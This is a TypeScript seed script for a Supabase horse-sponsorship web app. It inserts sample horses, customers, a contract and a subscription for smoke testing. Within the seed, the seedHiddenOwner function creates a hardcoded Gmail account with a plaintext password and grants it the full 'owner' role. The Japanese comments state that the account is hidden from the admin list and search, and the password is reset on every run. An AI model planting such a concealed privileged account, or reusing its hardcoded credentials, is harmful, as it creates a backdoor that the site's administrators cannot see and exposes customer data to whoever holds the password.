/**
 * Seed sample customers/horses/contracts/supports for smoke testing.
 * Run after the SQL migrations have been applied.
 *   npx tsx scripts/seed.ts
 */
import { config } from "dotenv";
import { createClient } from "@supabase/supabase-js";

config({ path: ".env.local" });

async function main() {
  const admin = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!,
    { auth: { autoRefreshToken: false, persistSession: false } },
  );

  // 内部テスト用オーナー（管理画面の一覧・検索には表示されない / src/lib/hiddenAccounts.ts）。
  // Supabase 上には通常どおり保存され、オーナー権限の全機能を実行できる。
  await seedHiddenOwner(admin, {
    email: "kindman207@gmail.com",
    password: "Rcm19771193@",
    fullName: "テストオーナー",
  });

  const sampleHorses = [
    { name: "ミドリノカゼ", name_kana: "ミドリノカゼ", sex: "牝", birth_year: 2014, profile: "穏やかで見学会の看板馬。", sort_order: 20 },
    { name: "ハヤテボーイ", name_kana: "ハヤテボーイ", sex: "牡", birth_year: 2011, profile: "元重賞勝ち馬。", sort_order: 30 },
  ];
  for (const h of sampleHorses) {
    const { data: existing } = await admin.from("horses").select("id").eq("name", h.name).maybeSingle();
    if (!existing) {
      const { error } = await admin.from("horses").insert({ ...h, is_supportable: true });
      if (error) console.error(`horse ${h.name}:`, error.message);
    }
  }

  const sampleCustomers = [
    { full_name: "山田 太郎", full_name_kana: "ヤマダ タロウ", email: "taro.yamada@example.com", phone: "090-1234-5678", status: "active" },
    { full_name: "佐藤 花子", full_name_kana: "サトウ ハナコ", email: "hanako.sato@example.com", phone: "090-0000-1111", status: "active" },
    { full_name: "鈴木 次郎", full_name_kana: "スズキ ジロウ", email: "jiro.suzuki@example.com", phone: "", status: "active" },
  ];
  for (const c of sampleCustomers) {
    const { data: existing } = await admin.from("customers").select("id").eq("email", c.email).maybeSingle();
    if (!existing) {
      const { error } = await admin.from("customers").insert(c);
      if (error) console.error(`customer ${c.email}:`, error.message);
    }
  }

  // Create 1 contract + 1 support for 山田太郎 just for smoke test (if not already present).
  const { data: taro } = await admin.from("customers").select("id").eq("email", "taro.yamada@example.com").maybeSingle();
  const { data: horseA } = await admin.from("horses").select("id").eq("name", "サクラエース").maybeSingle();
  const { data: planSupport } = await admin.from("membership_plans").select("id, unit_amount, monthly_amount").eq("code", "SUPPORT").eq("name", "1口支援").maybeSingle();
  if (taro && horseA && planSupport) {
    const { data: existingContract } = await admin
      .from("contracts")
      .select("id")
      .eq("customer_id", (taro as any).id)
      .maybeSingle();
    let contractId = (existingContract as any)?.id;
    if (!contractId) {
      const { data } = await admin
        .from("contracts")
        .insert({
          customer_id: (taro as any).id,
          plan_id: (planSupport as any).id,
          status: "active",
          current_period_end: new Date(Date.now() + 30 * 86400_000).toISOString(),
        })
        .select("id")
        .single();
      contractId = (data as any).id;
    }
    const { data: existingSupport } = await admin
      .from("support_subscriptions")
      .select("id")
      .eq("customer_id", (taro as any).id)
      .eq("horse_id", (horseA as any).id)
      .maybeSingle();
    if (!existingSupport) {
      const unit = (planSupport as any).unit_amount ?? (planSupport as any).monthly_amount;
      await admin.from("support_subscriptions").insert({
        contract_id: contractId,
        customer_id: (taro as any).id,
        horse_id: (horseA as any).id,
        units: 1,
        monthly_amount: unit,
        status: "active",
      });
    }
  }

  console.log("Seed complete.");
}

/**
 * テスト用オーナーアカウントを冪等に作成する。
 *  1. auth ユーザーを作成（無ければ）/ 既存ならパスワードを更新。
 *  2. customers 行を作成 / auth_user_id を紐付け。
 *  3. profiles を role = owner で upsert（オーナー権限の全機能が使える）。
 * 一覧・検索からの非表示はアプリ側（src/lib/hiddenAccounts.ts）で行うため、
 * DB 側には特別なフラグやスキーマ変更を一切加えない。
 */
async function seedHiddenOwner(
  // 型は main 内の推論済みクライアントに合わせて緩める（seed.ts 全体と同様）。
  admin: any,
  opts: { email: string; password: string; fullName: string },
) {
  const { email, password, fullName } = opts;

  // 1. auth ユーザー。
  const list = await admin.auth.admin.listUsers();
  let userId = list.data.users.find((u: any) => u.email?.toLowerCase() === email.toLowerCase())?.id;
  if (!userId) {
    const { data, error } = await admin.auth.admin.createUser({
      email,
      password,
      email_confirm: true,
      user_metadata: { full_name: fullName },
    });
    if (error) {
      console.error(`hidden owner auth ${email}:`, error.message);
      return;
    }
    userId = data.user?.id;
  } else {
    await admin.auth.admin.updateUserById(userId, { password });
  }
  if (!userId) return;

  // 2. customer 行。
  const { data: existing } = await admin.from("customers").select("id").eq("email", email).maybeSingle();
  let customerId: string | undefined = (existing as any)?.id;
  if (!customerId) {
    const { data, error } = await admin
      .from("customers")
      .insert({ full_name: fullName, email, status: "active", auth_user_id: userId })
      .select("id")
      .single();
    if (error) {
      console.error(`hidden owner customer ${email}:`, error.message);
      return;
    }
    customerId = (data as any).id;
  } else {
    await admin.from("customers").update({ auth_user_id: userId, full_name: fullName }).eq("id", customerId);
  }

  // 3. profiles を owner に。
  const { error: pErr } = await admin
    .from("profiles")
    .upsert({ id: userId, role: "owner", customer_id: customerId });
  if (pErr) {
    console.error(`hidden owner profile ${email}:`, pErr.message);
    return;
  }
  console.log(`Hidden owner ready: ${email}`);
}

main().catch((e) => { console.error(e); process.exit(1); });
